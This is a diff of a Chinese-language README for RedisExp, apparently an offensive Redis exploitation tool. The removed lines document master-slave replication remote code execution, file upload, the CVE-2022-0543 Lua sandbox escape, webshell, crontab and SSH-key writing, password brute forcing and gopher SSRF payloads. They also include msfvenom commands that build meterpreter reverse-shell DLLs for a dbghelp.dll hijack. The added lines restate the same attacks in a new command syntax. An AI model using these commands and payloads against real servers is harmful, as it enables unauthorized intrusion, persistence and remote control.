@@ -1,66 +1,5 @@
 ## Redis 漏洞利用工具
 
-快捷使用：`RedisExp`
-
-```
-
-██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
-██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
-██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
-██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
-██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
-╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝
-
-2022/05/23 23:36:54 [+]  -h 靓仔查看下帮助吧
-Example:
-主从复制命令执行:
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console
-
-Linux:
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -so exp.so
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console -so exp.so
-
-主从复制文件上传:
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dump.rdb -lfile dump.rdb -upload
-
-主动关闭主从复制:
-RedisExp.exe -rhost 192.168.211.131 -slaveof
-
-Lua沙盒绕过命令执行 CVE-2022-0543:
-RedisExp.exe -rhost 192.168.211.131 -lua -console
-
-备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置):
-RedisExp.exe -rhost 192.168.211.131 -shell -gbk
-
-Linux 写计划任务:
-RedisExp.exe -rhost 192.168.211.131 -crontab
-
-Linux 写 SSH 公钥:
-RedisExp.exe -rhost 192.168.211.131 -ssh
-
-爆破 Redis 密码:
-RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt
-
-执行 Redis 命令:
-RedisExp.exe -rhost 192.168.211.131 -cli
-
-生成 gopher ssrf redis payload: 
-
-RedisExp.exe -gf 1.txt -gip 127.0.0.1:6379 -gopher
-
-```
-
-```
-cmd
-├── exp.dll        默认导入的Windows Redis模块
-├── exp.so         导入的Linux Redis模块
-├── main.go        编译攻击主程序
-├── pass.txt       爆破字典
-
-```
-
-
 
 ### 声明
 
@@ -75,149 +14,55 @@ cmd
 ------
 
 
-
-### 主从复制漏洞
-
-#### 命令执行
-
-- 默认 windows 加载的是 `exp.dll`
-- 默认是非交互式 shell
-
-````
-Windows:
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console
-
-Linux:
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -so exp.so
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console -so exp.so
-````
-
-![](images/slave_Rce.png)
-
-#### 文件上传
-
-```
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dump.rdb -lfile dump.rdb -upload
 ```
 
-![](images/slave_Upload.png)
+██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
+██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
+██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
+██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
+██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
+╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝
 
-#### Windows 劫持 dbghelp.dll
+基本连接: 
+RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456
 
-https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/#toc-heading-22
+爆破 Redis 密码:
+RedisExp.exe brute -r 192.168.19.1 -f pass.txt
 
-1、使用 msf 生成 dll ，（cs 需要自己写一个调用 rundll32 .exe的dll，不能直接使用）
+主从复制执行命令 (默认是交互式 shell):
+RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -c whoami (单次执行)
+RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1
+RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -f exp.so (Linux)
 
-```
-# 64 位
+主从复制文件上传 (windows 中文需要设置gbk):
+RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -d c:\\中文\\ -f shell.php -F shell.txt -g
+RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -f shell.php -F shell.txt
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=192.168.211.130 LPORT=5555 > 64.dll
+Lua沙盒绕过命令执行 CVE-2022-0543:
+RedisExp.exe lua -r 192.168.19.6 -c whoami
 
-# 32 位
-msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f dll LHOST=ip LPORT=端口 > reverse_32bit.dll
-```
+备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置):
+RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "<?php phpinfo();?>" -g
 
-2、生成项目DLL后使用Koppeling项目中的Python3脚本来链接到转发DLL: https://github.com/monoxgas/Koppeling
+Linux 写计划任务:
+RedisExp.exe cron -r 192.168.19.1 -L 127.0.0.1 -P 2222
 
-```
-python -m pip install pefile
+Linux 写 SSH 公钥:
+RedisExp.exe ssh -r 192.168.19.1 -u root -s "ssh-rsa AAAAB"
 
-python .\PyClone.py 64.dll C:\windows\system32\dbghelp.dll -o dbghelp.dll
-```
+执行 Redis 命令:
+RedisExp.exe cli -r 192.168.19.1
 
-3、利用主从复制上传制作好的  dbghelp.dll
+生成 gopher ssrf redis payload: 
+RedisExp.exe gopher -f 1.txt
 
-```
-RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dbghelp.dll -lfile dbghelp.dll -upload
-```
-
-4、执行 bgsave 成功上线
-
-```
-RedisExp.exe -rhost 192.168.211.134 -cli
-
-bgsave
-```
-
-5、dll 需要免杀，好像不太稳定，自行在本地测试再利用。
-
-
-
-### RDB备份文件利用
-
-#### 写 Webshell
-
-```
-RedisExp.exe -rhost 192.168.211.131 -shell
-```
-
-![](images/webshell.png)
-
-
-
-### Linux写计划任务
-
-没搭建环境测试
-
-```
-RedisExp.exe -rhost 192.168.211.133 -crontab
-```
-
-![](images/crontab.png)
-
-
-
-### Linux写SSH公钥
-
-没搭建环境测试
-
-```
-RedisExp.exe -rhost 192.168.211.133 -ssh
-```
-
-![](images/ssh.png)
-
-
-
-### Lua沙盒绕过命令执行 CVE-2022-0543
-
-```
-RedisExp.exe -rhost 192.168.211.130 -lua -console
-```
-
-![](images/lua.png)
-
-
-### 爆破 Redis 密码
-
-```
-RedisExp.exe -rhost 192.168.211.131 -brute -pwdf pass.txt
-```
-
-![](images/pass.png)
-
-
-
-### 生成 Gopher Payload
-
-redis 未授权写 shell (1.txt)
-
-```
-flushall
-config set dir C:\phpstudy_pro\WWW
-config set dbfilename test.php
-set 'webshell' '<?php phpinfo();?>'
-save
 ```
 
 
 
-```
-RedisExp.exe -gf 1.txt -gip 127.0.0.1:6379 -gopher
-```
-
-![](images/gopher.png)
+1. 具体命令使用 -h 来查看
+2. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
+3. Windows 中文路径需要设置gbk，使用 -g 参数就可以了。
 
 
 
